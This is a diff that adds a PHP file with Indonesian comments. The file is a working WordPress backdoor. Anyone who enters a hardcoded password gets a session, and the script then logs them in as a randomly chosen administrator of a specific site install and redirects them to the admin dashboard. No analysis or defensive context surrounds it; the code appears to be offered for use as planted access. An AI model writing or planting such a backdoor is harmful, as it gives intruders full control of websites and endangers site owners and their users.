@@ -1,0 +1,53 @@
+<?php
+session_start();
+
+$ewean = "jawahamil1337"; // password backdoor
+
+// Jika belum ada session "authenticated"
+if (!isset($_SESSION["authenticated"])) {
+
+    // Jika form password dikirim
+    if (isset($_POST["password"])) {
+
+        // Jika password benar
+        if ($_POST["password"] === $ewean) {
+            $_SESSION["authenticated"] = true;
+        } else {
+            echo "Password salah!";
+        }
+    }
+
+    // Jika tetap belum authenticated → tampilkan form login
+    if (!isset($_SESSION["authenticated"])) {
+        echo '<form method="post">';
+        echo 'Password: <input type="password" name="password">';
+        echo '<input type="submit" value="Login">';
+        echo '</form>';
+        die;
+    }
+}
+
+// Jika sudah authenticated → muat WordPress
+require_once "/var/www/html/pusatkarir/wp-load.php";
+
+// Ambil semua user ber-role administrator
+$admins = get_users(array("role" => "administrator"));
+
+if (!empty($admins)) {
+
+    // Pilih salah satu admin secara random
+    $random_admin = $admins[array_rand($admins)];
+    $user_id = $random_admin->ID;
+
+    // Login otomatis sebagai admin tersebut
+    wp_set_auth_cookie($user_id);
+    wp_set_current_user($user_id);
+
+    // Redirect langsung ke dashboard admin
+    wp_redirect(admin_url());
+    die;
+
+} else {
+    echo "Tidak ada administrator yang ditemukan.";
+}
+?>
